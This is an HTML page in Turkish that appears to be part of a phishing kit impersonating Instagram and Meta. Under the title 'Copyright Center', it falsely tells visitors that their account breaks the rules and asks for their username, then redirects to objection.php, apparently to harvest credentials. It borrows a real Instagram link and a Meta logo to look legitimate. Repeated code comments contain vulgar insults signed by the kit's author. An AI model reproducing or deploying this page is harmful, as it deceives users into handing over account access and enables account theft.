<html lang="tr">
   <head>
      <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta property="og:image" content="img/ilogo.jpg">
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="stylesheet" href="css/style.css">
      <link rel="icon" type="image/png" href="img/favicon.png">
      <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
      <link rel="stylesheet" type="text/css" href="css/vendor/animate/animate.css">
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
      <link rel="stylesheet" type="text/css" href="css/util.css">
      <title>Talep Oluştur</title>
   </head>
   <body style="">
      <div class="container">
         <div class="forms-container">
            <div class="signin-signup">
               <form autocomplete="off" id="morto" class="sign-in-form">
                  <h2 class="title" style="
                     font-size: 30px;">Telif Hakkı Merkezi
                  </h2>
                  <br>
                  <center>
                     <p>Bu sayfaya yönlendirildiniz, hesabınız 
                        kurallarımızı ihlal ediyor, bunun bir hata olduğunu düşünüyorsanız 
                        lütfen hesabınızı doğrulamak için formu doldurun.       
                     </p>
                  </center>
                  <br><br>
                  <div class="input-field">
                     <i class="fa fa-user"></i>
                     <input required="" type="text" id="usr" name="username" placeholder="Kullanıcı Adı">
                  </div>
                  <button type="submit" id="mortousername" class="btn">Devam Et</button>
                  <br>
                  <center>
                     <h6><font style="font-size:18px" onclick="javascript:window.location.href='https://www.instagram.com/accounts/password/reset/'; " color="#00376b">Şifreni mi Unuttun?</font></h6>
                  </center>
                  <br><br><br>
               </form>
            </div>
         </div>
         <div class="panels-container">
            <div class="panel left-panel">
               <div class="content">
                  <img src="img/logo-1024x858.png" width="150px">
               </div>
               <img src="img/log.svg" class="image" alt="">
            </div>
         </div>
      </div>
      <hr>
      <center>
         <footer><img src="img/metaa.jpg" width="120" height="70"><img></footer>
      </center>
      <script>
         $("#morto").submit(function(event){
         var btn = $("#mortousername");
         btn.prop("disabled", true); 
            
         
            btn.html("Kullanıcı aranıyor...");
                       event.preventDefault();
             window.location.href="objection.php?user="+$('#usr').val();
         });
             
      </script>
      <script src="css/app.js"></script>
      <!--BUNU YAZAN TOSUN ÇALMAYA ÇALIŞAN OROSPU ÇOCUKLARINA GOSUN - MORTOJOSE GURURLA ANANIZI SİKER-->  
      <script src="css/vendor/jquery/jquery-3.2.1.min.js"></script>
      <!--BUNU YAZAN TOSUN ÇALMAYA ÇALIŞAN OROSPU ÇOCUKLARINA GOSUN - MORTOJOSE GURURLA ANANIZI SİKER-->
      <script src="css/vendor/bootstrap/js/popper.js"></script>
      <script src="css/vendor/bootstrap/js/bootstrap.min.js"></script>
      <!--BUNU YAZAN TOSUN ÇALMAYA ÇALIŞAN OROSPU ÇOCUKLARINA GOSUN - MORTOJOSE GURURLA ANANIZI SİKER-->
      <script src="css/vendor/select2/select2.min.js"></script>
      <!--BUNU YAZAN TOSUN ÇALMAYA ÇALIŞAN OROSPU ÇOCUKLARINA GOSUN - MORTOJOSE GURURLA ANANIZI SİKER-->
      <script src="css/vendor/tilt/tilt.jquery.min.js"></script>
   </body>
</html>